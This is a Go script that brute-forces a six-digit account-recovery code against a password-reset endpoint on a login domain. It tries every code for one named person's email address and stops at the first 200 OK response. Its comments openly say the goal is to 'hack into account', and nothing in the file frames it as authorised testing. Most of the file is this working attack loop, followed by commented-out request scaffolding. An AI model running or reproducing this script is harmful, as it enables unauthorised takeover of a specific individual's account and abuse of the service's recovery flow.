// Utilize http requests to hack into account....look into how to do that! Stop going around and fucking around and face the unknown

// Utilize the endpoint to guess the verification code and check for 200 OK status vs 400 Bad Requests status

//GOAL is to get the response from GET == Success  aka 200 OK
// Client.do() - To submit a request or find an easier way to submit an http request
// Read the response of a request, and check for 200 OK or 400 Bad Request
// Bonus points: Return the json that the endpoint has sent us, but to hack this endpoint, we don't need to know what the response is. This is just for learning.

// Use a for loop, but for 000000 to 99999 <-- not valid
// for 0 to 999999 <-- this is valid, but we can't use this int he api?
package main

import (
	"fmt"
	"net/http"
)

func main() {
	//  Make sample HTTP GET request for website

	response, err := http.Get("https://login.platform.mattel/account/recover/end?token=%s&email=tiffanny.hernaez%40mattel.com")
	if err != nil {
		fmt.Println("HTTP GET request failed: ", err)
	}
	client := &http.Client{}
	defer response.Body.Close()

	// Loop on testing the verification code
	url1 := "https://login.platform.mattel/account/recover/end?token="
	url2 := "&email=tiffanny.hernaez%40mattel.com"

	for index := 1; index < 999999; index++ {
		n := fmt.Sprintf("%06d", index)
		url := url1 + string(n) + url2

		// Testing purposes
		fmt.Println(url)

		// Creating a client
		req, err := http.NewRequest("GET", url, nil)
		res, err := client.Do(req)
		if err != nil {
			fmt.Println("HTTP call failed:", err)
			break
		}

		// Check for 200 OK
		if res.StatusCode == http.StatusOK {
			fmt.Println("VERIFICATION CODE CORRECT. STATUS: ", res.StatusCode)
			break
		}
	}

	// fmt.Println(res)

	// defer response.Body.Close()
	// bodyBytes, err := ioutil.ReadAll(response.Body)
	// // Error checking of the ioutil.ReadAll() request
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// bodyString := string(bodyBytes)
	// fmt.Println("BODY: ", bodyString)

	// fmt.Println("HEADER: ", response.Header)

	// token := response.Header.Get("token")

	// // Prints out the response status
	// fmt.Println("RESPONSE STATUS: ", response.Status)
	// fmt.Println("TOKEN: ", token)

	// Checking for response error
	// if err != nil {
	// 	log.Fatal(err)

	// }

	// // Read all response body
	// data, _ := ioutil.ReadAll(res.Body)

	// // Close response body
	// res.Body.Close()

	// // Print Data as a string
	// fmt.Printf("%s\n", data)

	// request, err := http.NewRequest("GET", "https://login.platform.mattel/account/recover/end?token=211440&email=tiffanny.hernaez%40mattel.com", nil)
	// client := http.Client{}

	// res, err := client.Do(request)
	// if err != nil {
	// 	fmt.Println("HTTP call failed:", err)
	// 	return
	// }
	// // Don't forget, you're expected to close response body even if you don't want to read it.
	// defer response.Body.Close()

	// if res.StatusCode != http.StatusOK {
	// 	fmt.Println("Non-OK HTTP status:", response.StatusCode)
	// 	// You may read / inspect response body
	// 	return
	// }
	// defer resp.Body.Close()
	// body, err := io.ReadAll(resp.Body)

	// All is OK, server reported success.
}
